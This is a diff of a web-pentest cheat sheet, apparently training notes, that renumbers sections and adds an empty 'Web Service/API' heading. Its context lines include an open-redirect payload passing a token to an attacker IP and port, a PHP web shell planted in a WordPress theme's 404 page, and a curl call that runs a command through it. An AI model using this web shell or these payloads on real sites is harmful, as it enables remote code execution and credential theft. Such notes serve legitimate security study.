@@ -27,9 +27,10 @@ Overview
 23. - [Session Hijacking](#23---session-hijacking)
 24. - [Session Fixation](#24---session-fixation)
 25. - [Cross-Site Request Forgery](#25---cross-site-request-forgery-csrf)
-26. - [Open Redirect](#26---open-redirect) 
-27. - [WordPress](#27---wordpress) 
-28. - [Exploit Research](#28---exploit-research)
+26. - [Open Redirect](#26---open-redirect)
+27. - [Web Service/API](#27---web-service-api) 
+28. - [WordPress](#28---wordpress) 
+29. - [Exploit Research](#29---exploit-research)
    
 #1. - Web Requests
 -----------------------------------------
@@ -1838,7 +1839,10 @@ http://oredirect.htb.net/?redirect_uri=http://<IP address>:<port>&token=<RANDOM 
 ?redir=
 ```
 
-#27. - WordPress
+#27. - Web Service/API
+-----------------------------------------
+
+#28. - WordPress
 -----------------------------------------
 
 - Version Enumeration
@@ -1900,7 +1904,7 @@ system($_GET['cmd']);
 $ curl -X GET "http://<URL>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```
 
-#28. - Exploit Research
+#29. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
